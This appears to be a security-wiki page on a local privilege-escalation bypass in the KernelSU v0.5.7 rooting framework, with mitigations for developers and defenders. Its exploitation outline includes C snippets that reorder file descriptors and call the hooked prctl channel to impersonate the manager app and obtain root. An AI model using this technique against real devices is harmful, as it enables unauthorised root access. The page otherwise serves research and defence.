# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks like KernelSU, APatch, SKRoot and Magisk frequently patch the Linux/Android kernel and expose privileged functionality to an unprivileged userspace "manager" app via a hooked syscall. If the manager-authentication step is flawed, any local app can reach this channel and escalate privileges on already-rooted devices.

This page abstracts the techniques and pitfalls uncovered in public research (notably Zimperium’s analysis of KernelSU v0.5.7) to help both red and blue teams understand attack surfaces, exploitation primitives, and robust mitigations.

---
## Architecture pattern: syscall-hooked manager channel

- Kernel module/patch hooks a syscall (commonly prctl) to receive "commands" from userspace.
- Protocol typically is: magic_value, command_id, arg_ptr/len ...
- A userspace manager app authenticates first (e.g., CMD_BECOME_MANAGER). Once the kernel marks the caller as a trusted manager, privileged commands are accepted:
  - Grant root to caller (e.g., CMD_GRANT_ROOT)
  - Manage allowlists/deny-lists for su
  - Adjust SELinux policy (e.g., CMD_SET_SEPOLICY)
  - Query version/configuration
- Because any app can invoke syscalls, the correctness of the manager authentication is critical.

Example (KernelSU design):
- Hooked syscall: prctl
- Magic value to divert to KernelSU handler: 0xDEADBEEF
- Commands include: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.

---
## KernelSU v0.5.7 authentication flow (as implemented)

When userspace calls prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU verifies:

1) Path prefix check
- The provided path must start with an expected prefix for the caller UID, e.g. /data/data/<pkg> or /data/user/<id>/<pkg>.
  - Reference: core_hook.c (v0.5.7) path prefix logic.

2) Ownership check
- The path must be owned by the caller UID.
  - Reference: core_hook.c (v0.5.7) ownership logic.

3) APK signature check via FD table scan
- Iterate the calling process’ open file descriptors (FDs).
- Pick the first file whose path matches /data/app/*/base.apk.
- Parse APK v2 signature and verify against the official manager certificate.
  - References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).

If all checks pass, the kernel caches the manager’s UID temporarily and accepts privileged commands from that UID until reset.

---
## Vulnerability class: trusting “the first matching APK” from FD iteration

If the signature check binds to "the first matching /data/app/*/base.apk" found in the process FD table, it is not actually verifying the caller’s own package. An attacker can pre-position a legitimately signed APK (the real manager’s) so that it appears earlier in the FD list than their own base.apk.

This trust-by-indirection lets an unprivileged app impersonate the manager without owning the manager’s signing key.

Key properties exploited:
- The FD scan does not bind to the caller’s package identity; it only pattern-matches path strings.
- open() returns the lowest available FD. By closing lower-numbered FDs first, an attacker can control ordering.
- The filter only checks that the path matches /data/app/*/base.apk – not that it corresponds to the installed package of the caller.

---
## Attack preconditions

- The device is already rooted with a vulnerable rooting framework (e.g., KernelSU v0.5.7).
- The attacker can run arbitrary unprivileged code locally (Android app process).
- The real manager has not yet authenticated (e.g., right after a reboot). Some frameworks cache the manager UID after success; you must win the race.

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps:
1) Build a valid path to your own app data directory to satisfy prefix and ownership checks.
2) Ensure a genuine KernelSU Manager base.apk is opened on a lower-numbered FD than your own base.apk.
3) Invoke prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) to pass the checks.
4) Issue privileged commands like CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY to persist elevation.

Practical notes on step 2 (FD ordering):
- Identify your process’ FD for your own /data/app/*/base.apk by walking /proc/self/fd symlinks.
- Close a low FD (e.g., stdin, fd 0) and open the legitimate manager APK first so it occupies fd 0 (or any index lower than your own base.apk fd).
- Bundle the legitimate manager APK with your app so its path satisfies the kernel’s naive filter. For example, place it under a subpath matching /data/app/*/base.apk.

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
    DIR *d = opendir("/proc/self/fd");
    if (!d) return -1;
    struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
    int best_fd = -1;
    while ((e = readdir(d))) {
        if (e->d_name[0] == '.') continue;
        int fd = atoi(e->d_name);
        snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
        ssize_t n = readlink(link, p, sizeof(p)-1);
        if (n <= 0) continue; p[n] = '\0';
        if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
            if (best_fd < 0 || fd < best_fd) {
                best_fd = fd; strncpy(out_path, p, PATH_MAX);
            }
        }
    }
    closedir(d);
    return best_fd; // First (lowest) matching fd
}
```

Force a lower-numbered FD to point at the legitimate manager APK:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
    // Reuse stdin (fd 0) if possible so the next open() returns 0
    close(0);
    int fd = open(legit_apk_path, O_RDONLY);
    (void)fd; // fd should now be 0 if available
}
```

Manager authentication via prctl hook:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
                            unsigned long arg3, unsigned long arg4) {
    return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
    long result = -1;
    // arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
    result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
    return (int)result;
}
```

After success, privileged commands (examples):
- CMD_GRANT_ROOT: promote current process to root
- CMD_ALLOW_SU: add your package/UID to allowlist for persistent su
- CMD_SET_SEPOLICY: adjust SELinux policy as supported by framework

Race/persistence tip:
- Register a BOOT_COMPLETED receiver in AndroidManifest (RECEIVE_BOOT_COMPLETED) to start early after reboot and attempt authentication before the real manager.

---
## Detection and mitigation guidance

For framework developers:
- Bind authentication to the caller’s package/UID, not to arbitrary FDs:
  - Resolve the caller’s package from its UID and verify against the installed package’s signature (via PackageManager) rather than scanning FDs.
  - If kernel-only, use stable caller identity (task creds) and validate on a stable source of truth managed by init/userspace helper, not process FDs.
- Avoid path-prefix checks as identity; they are trivially satisfiable by the caller.
- Use nonce-based challenge–response over the channel and clear any cached manager identity at boot or on key events.
- Consider binder-based authenticated IPC instead of overloading generic syscalls when feasible.

For defenders/blue team:
- Detect presence of rooting frameworks and manager processes; monitor for prctl calls with suspicious magic constants (e.g., 0xDEADBEEF) if you have kernel telemetry.
- On managed fleets, block or alert on boot receivers from untrusted packages that rapidly attempt privileged manager commands post-boot.
- Ensure devices are updated to patched framework versions; invalidate cached manager IDs on update.

Limitations of the attack:
- Only affects devices already rooted with a vulnerable framework.
- Typically requires a reboot/race window before the legitimate manager authenticates (some frameworks cache manager UID until reset).

---
## Related notes across frameworks

- Password-based auth (e.g., historical APatch/SKRoot builds) can be weak if passwords are guessable/bruteforceable or validations are buggy.
- Package/signature-based auth (e.g., KernelSU) is stronger in principle but must bind to the actual caller, not indirect artefacts like FD scans.
- Magisk: CVE-2024-48336 (MagiskEoP) showed that even mature ecosystems can be susceptible to identity spoofing leading to code execution with root inside manager context.

---
## References

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}